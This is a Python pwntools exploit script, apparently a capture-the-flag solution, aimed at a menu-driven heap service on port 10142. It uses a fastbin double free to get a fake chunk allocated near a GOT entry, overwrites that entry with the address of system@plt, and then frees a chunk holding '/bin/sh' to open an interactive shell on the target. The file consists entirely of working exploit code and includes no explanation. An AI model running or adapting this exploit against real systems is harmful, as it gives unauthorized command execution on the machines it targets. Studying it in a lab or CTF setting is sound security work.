#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
system_plt = 0x4007d0

if len(sys.argv) == 1:
    r = remote('192.168.56.101', 10142)
elif len(sys.argv) == 2:
    r = remote(sys.argv[1], 10142)
else:
    sys.exit()

def allocate(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

allocate(0x50, '11111111') #0
allocate(0x50, '22222222') #1

free(0)
free(1)
free(0)

fake_chunk = 0x602002 - 0x8

allocate(0x50, p64(fake_chunk)) #2
allocate(0x50, '/bin/sh\x00') #3
allocate(0x50, 'dada') #4
allocate(0x50, 'a'*0xe + p64(system_plt)) #5
free(3)
r.interactive()
